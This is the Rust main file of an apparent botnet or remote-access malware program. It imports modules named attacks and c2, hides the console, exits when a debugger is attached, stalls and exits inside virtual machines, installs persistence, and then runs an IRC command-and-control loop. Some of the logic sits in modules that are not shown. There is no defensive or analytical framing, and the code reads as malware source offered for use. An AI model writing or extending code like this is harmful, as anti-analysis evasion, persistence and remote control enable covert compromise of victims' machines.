mod config;
mod attacks;
mod utils;
mod c2;
mod web;

use std::error::Error;
use tokio::time::sleep;
use std::time::Duration;
use config::load_config;
use utils::{hide_console, check_debugger, check_anti_vm, persistence};
use c2::irc_c2;
use web::run_web_frontend;

#[tokio::main]
async fn main() -> Result<(), Box<dyn Error + Send + Sync>> {
    let args: Vec<String> = std::env::args().collect();
    if args.contains(&"--web".to_string()) {
        run_web_frontend().await?;
        return Ok(());
    }

    hide_console();
    
    load_config().await;
    
    if check_debugger() {
        std::process::exit(0);
    }

    if check_anti_vm().await {
        // If VM detected, stay silent or exit
        sleep(Duration::from_secs(3600)).await;
        std::process::exit(0);
    }

    persistence().await;

    tokio::select! {
        _ = irc_c2() => {},
        _ = tokio::signal::ctrl_c() => {},
    }

    Ok(())
}